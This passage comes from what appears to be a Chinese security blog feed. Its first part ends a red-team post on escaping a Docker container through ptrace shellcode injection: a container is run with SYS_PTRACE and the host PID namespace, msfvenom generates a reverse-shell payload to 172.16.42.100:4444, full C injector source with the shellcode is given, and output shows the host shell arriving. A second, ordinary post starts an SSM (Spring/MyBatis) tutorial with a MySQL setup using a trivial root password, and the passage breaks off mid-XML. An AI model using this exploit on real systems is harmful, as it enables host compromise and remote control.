<h2 id="3-利用shellcode进程注入进行容器逃逸"><a href="#3-利用shellcode进程注入进行容器逃逸" class="headerlink" title="3. 利用shellcode进程注入进行容器逃逸"></a>3. 利用shellcode进程注入进行容器逃逸</h2><p>攻击机器：172.16.42.100</p>
<p>靶机：172.16.42.151</p>
<p>带有SYS_PTRACE权限的容器还是挺多的，对于开发来说可能需要SYS_PTRACE权限进行调试</p>
<p>靶机启动带宿主机进程和CAP_SYS_PTRACE特权的容器</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">docker <span class="builtin-name">run</span> --name test -itd <span class="attribute">--cap-add</span>=SYS_PTRACE <span class="attribute">--pid</span>=host --security-opt <span class="attribute">apparmor</span>=unconfined --rm ubuntu</span><br></pre></td></tr></table></figure>

<p><strong>利用成功前提：</strong></p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="attribute">--cap-add</span>=SYS_PTRACE</span><br><span class="line"><span class="attribute">--pid</span>=host</span><br><span class="line">--security-opt <span class="attribute">apparmor</span>=unconfined</span><br></pre></td></tr></table></figure>



<p>获取poc：<a href="https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c">https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c</a></p>
<p>生成shellcode(如果不生成，会在靶机上生成一个终端):</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/x64/shell_reverse_tcp <span class="attribute">LHOST</span>=172.16.42.100 <span class="attribute">LPORT</span>=4444 -f c</span><br></pre></td></tr></table></figure>

<p>替换shellcode(==注意长度#define SHELLCODE_SIZE 74，等于shellcode的大小，一定要设置为相应大小的值==）:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  Mem Inject</span></span><br><span class="line"><span class="comment">  Copyright (c) 2016 picoFlamingo</span></span><br><span class="line"><span class="comment">This program is free software: you can redistribute it and/or modify</span></span><br><span class="line"><span class="comment">it under the terms of the GNU General Public License as published by</span></span><br><span class="line"><span class="comment">the Free Software Foundation, either version 3 of the License, or</span></span><br><span class="line"><span class="comment">(at your option) any later version.</span></span><br><span class="line"><span class="comment">This program is distributed in the hope that it will be useful,</span></span><br><span class="line"><span class="comment">but WITHOUT ANY WARRANTY; without even the implied warranty of</span></span><br><span class="line"><span class="comment">MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span></span><br><span class="line"><span class="comment">GNU General Public License for more details.</span></span><br><span class="line"><span class="comment">You should have received a copy of the GNU General Public License</span></span><br><span class="line"><span class="comment">along with this program.  If not, see &lt;http://www.gnu.org/licenses/&gt;.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/reg.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHELLCODE_SIZE 74</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *shellcode = </span><br><span class="line"><span class="string">&quot;\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\xb9\x02\x00\x11\x5c\xac\x10\x2a\x64\x51\x48\x89\xe6\x6a\x10&quot;</span></span><br><span class="line"><span class="string">&quot;\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58&quot;</span></span><br><span class="line"><span class="string">&quot;\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f&quot;</span></span><br><span class="line"><span class="string">&quot;\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05&quot;</span>; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">inject_data</span> <span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">unsigned</span> <span class="keyword">char</span> *src, <span class="keyword">void</span> *dst, <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span>      i;</span><br><span class="line">  <span class="keyword">uint32_t</span> *s = (<span class="keyword">uint32_t</span> *) src;</span><br><span class="line">  <span class="keyword">uint32_t</span> *d = (<span class="keyword">uint32_t</span> *) dst;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i+=<span class="number">4</span>, s++, d++)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ((ptrace (PTRACE_POKETEXT, pid, d, *s)) &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  perror (<span class="string">&quot;ptrace(POKETEXT):&quot;</span>);</span><br><span class="line">	  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">main</span> <span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">pid_t</span>                   target;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">user_regs_struct</span> <span class="title">regs</span>;</span></span><br><span class="line">  <span class="keyword">int</span>                     syscall;</span><br><span class="line">  <span class="keyword">long</span>                    dst;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (argc != <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">fprintf</span> (<span class="built_in">stderr</span>, <span class="string">&quot;Usage:\n\t%s pid\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">      <span class="built_in">exit</span> (<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  target = atoi (argv[<span class="number">1</span>]);</span><br><span class="line">  <span class="built_in">printf</span> (<span class="string">&quot;+ Tracing process %d\n&quot;</span>, target);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((ptrace (PTRACE_ATTACH, target, <span class="literal">NULL</span>, <span class="literal">NULL</span>)) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      perror (<span class="string">&quot;ptrace(ATTACH):&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span> (<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span> (<span class="string">&quot;+ Waiting for process...\n&quot;</span>);</span><br><span class="line">  wait (<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span> (<span class="string">&quot;+ Getting Registers\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ((ptrace (PTRACE_GETREGS, target, <span class="literal">NULL</span>, &amp;regs)) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      perror (<span class="string">&quot;ptrace(GETREGS):&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span> (<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Inject code into current RPI position */</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span> (<span class="string">&quot;+ Injecting shell code at %p\n&quot;</span>, (<span class="keyword">void</span>*)regs.rip);</span><br><span class="line">  inject_data (target, shellcode, (<span class="keyword">void</span>*)regs.rip, SHELLCODE_SIZE);</span><br><span class="line"></span><br><span class="line">  regs.rip += <span class="number">2</span>;</span><br><span class="line">  <span class="built_in">printf</span> (<span class="string">&quot;+ Setting instruction pointer to %p\n&quot;</span>, (<span class="keyword">void</span>*)regs.rip);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((ptrace (PTRACE_SETREGS, target, <span class="literal">NULL</span>, &amp;regs)) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      perror (<span class="string">&quot;ptrace(GETREGS):&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span> (<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="built_in">printf</span> (<span class="string">&quot;+ Run it!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> ((ptrace (PTRACE_DETACH, target, <span class="literal">NULL</span>, <span class="literal">NULL</span>)) &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  perror (<span class="string">&quot;ptrace(DETACH):&quot;</span>);</span><br><span class="line">	  <span class="built_in">exit</span> (<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>编译代码:</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">gcc infect.<span class="keyword">c</span> -o infect</span><br></pre></td></tr></table></figure>

<p>移动到容器：</p>
<figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line">docker cp infect test:<span class="regexp">/root/</span></span><br></pre></td></tr></table></figure>

<p>攻击机监听</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvvp <span class="number">4444</span></span><br></pre></td></tr></table></figure>

<p>靶机宿主机启动一个python server进程</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">python</span> -m SimpleHTTPServer <span class="number">55555</span></span><br></pre></td></tr></table></figure>

<p>查看python server进程:7365</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  poc docker cp infect <span class="built_in">test</span>:/root/</span><br><span class="line">➜  poc docker <span class="built_in">exec</span> -it <span class="built_in">test</span> /bin/bash</span><br><span class="line">root@f147ae171646:/<span class="comment"># ps -ef | grep 5555</span></span><br><span class="line">root      15260   7462  0 11:44 ?        00:00:00 python3 -m http.server 55555</span><br><span class="line">root      15262  15233  0 11:45 pts/1    00:00:00 grep --color=auto 5555</span><br><span class="line">root@f147ae171646:/<span class="comment"># /root/infect 15260</span></span><br><span class="line">+ Tracing process 15260</span><br><span class="line">+ Waiting <span class="keyword">for</span> process...</span><br><span class="line">+ Getting Registers</span><br><span class="line">+ Injecting shell code at 0x7fdb32ef77e4</span><br><span class="line">+ Setting instruction pointer to 0x7fdb32ef77e6</span><br><span class="line">+ Run it!</span><br><span class="line">root@f147ae171646:/<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p> 结果：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@master ~]<span class="comment"># nc -lvvp 4444</span></span><br><span class="line">Ncat: Version 7.50 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::4444</span><br><span class="line">Ncat: Listening on 0.0.0.0:4444</span><br><span class="line">Ncat: Connection from 172.16.42.151.</span><br><span class="line">Ncat: Connection from 172.16.42.151:37440.</span><br><span class="line">ifconfig</span><br><span class="line">ens33: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 172.16.42.151  netmask 255.255.255.0  broadcast 172.16.42.255</span><br><span class="line">        inet6 fe80::20c:29ff:fe01:f943  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 00:0c:29:01:f9:43  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 206535  bytes 221632693 (211.3 MiB)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>测试动态链接库进行容器逃逸没有成功。可能是不能将容器里的so文件注入到宿主机的进程靶。</p>
<h2 id="4-总结"><a href="#4-总结" class="headerlink" title="4. 总结"></a>4. 总结</h2><p>本文先使用动态链接库进行了进程注入，这种方式比较隐蔽，然后使用shellcode注入进程，两者的原理都是通过ptrace来实现的。shellcode的代码是单线程的所以会导致进程阻塞，也许可以加以改造，本人c代码能力有限，暂时不尝试。后续也许会添加用go实现的版本。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://payloads.online/archivers/2020-01-01/2/">https://payloads.online/archivers/2020-01-01/2/</a></li>
<li><a href="https://www.52coder.net/post/ld-preload">https://www.52coder.net/post/ld-preload</a></li>
<li><a href="https://payloads.online/archivers/2020-01-01/1/">https://payloads.online/archivers/2020-01-01/1/</a></li>
</ul>
]]></content>
      <categories>
        <category>红队技术</category>
      </categories>
      <tags>
        <tag>Linux安全</tag>
      </tags>
  </entry>
  <entry>
    <title>SSM整合案例</title>
    <url>/ssm%E6%95%B4%E5%90%88%E6%A1%88%E4%BE%8B/</url>
    <content><![CDATA[<p>使用Spring来整合SpringMVC和MyBatis，测试项目已传到<a href="https://github.com/ShadowFl0w/JavaDemo/tree/main/ssm">github</a></p>
<span id="more"></span>



<h2 id="1-介绍"><a href="#1-介绍" class="headerlink" title="1. 介绍"></a>1. 介绍</h2><p>使用Spring来整合SpringMVC和MyBatis</p>
<p><img src="../images/pics/java/15.jpg"></p>
<p>我们使用配置文件+注解的方式</p>
<h2 id="2-开发环境"><a href="#2-开发环境" class="headerlink" title="2. 开发环境"></a>2. 开发环境</h2><h3 id="2-1-数据库"><a href="#2-1-数据库" class="headerlink" title="2.1 数据库"></a>2.1 数据库</h3><p>在远程linux机器上创建mysql的docker环境</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">docker</span> run -itd --name my-mysql -p <span class="number">3306</span>:<span class="number">3306</span> -e MYSQL_ROOT_PASSWORD=<span class="number">123456</span> mysql:<span class="number">8</span>.<span class="number">0</span>.<span class="number">15</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">docker</span> exec -it my-mysql bash</span><br><span class="line"></span><br><span class="line"><span class="attribute">mysql</span> -uroot -p<span class="number">123456</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#开启远程访问</span></span><br><span class="line"><span class="attribute">use</span> mysql;</span><br><span class="line"><span class="attribute">ALTER</span> USER &#x27;root&#x27;@&#x27;%&#x27; IDENTIFIED WITH mysql_native_password BY &#x27;<span class="number">123456</span>&#x27;;</span><br><span class="line"><span class="attribute">flush</span> privileges;</span><br></pre></td></tr></table></figure>



<p>创建数据库</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> database ssm;</span><br><span class="line">use ssm;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> account(</span><br><span class="line">	id <span class="type">int</span> <span class="keyword">primary</span> key auto_increment,</span><br><span class="line">    name <span class="type">varchar</span>(<span class="number">20</span>),</span><br><span class="line">    money <span class="keyword">double</span> </span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>连接数据库，在account表中加入几条数据</p>
<img src="../images/pics/java/27.jpg" style="zoom:50%;" /> 



<h3 id="2-2-依赖"><a href="#2-2-依赖" class="headerlink" title="2.2 依赖"></a>2.2 依赖</h3><p>版本锁定</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">spring.version</span>&gt;</span>5.0.2.RELEASE<span class="tag">&lt;/<span class="name">spring.version</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">slf4j.version</span>&gt;</span>1.6.6<span class="tag">&lt;/<span class="name">slf4j.version</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">log4j.version</span>&gt;</span>1.2.12<span class="tag">&lt;/<span class="name">log4j.version</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">mysql.version</span>&gt;</span>8.0.15<span class="tag">&lt;/<span class="name">mysql.version</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">mybatis.version</span>&gt;</span>3.4.5<span class="tag">&lt;/<span class="name">mybatis.version</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>依赖</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.11<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.aspectj<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>aspectjweaver<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.6.8<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-aop<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;spring.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-context<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;spring.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;spring.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-webmvc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;spring.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;spring.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-tx<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;spring.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-jdbc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;spring.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;mysql.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>servlet-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet.jsp<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jsp-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>jstl<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jstl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="comment">&lt;!-- log start --&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;log4j.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>slf4j-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;slf4j.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>slf4j-log4j12<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;slf4j.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="comment">&lt;!-- log end --&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;mybatis.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-spring<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.3.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>c3p0<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>c3p0<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.9.1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">type</span>&gt;</span>jar<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span 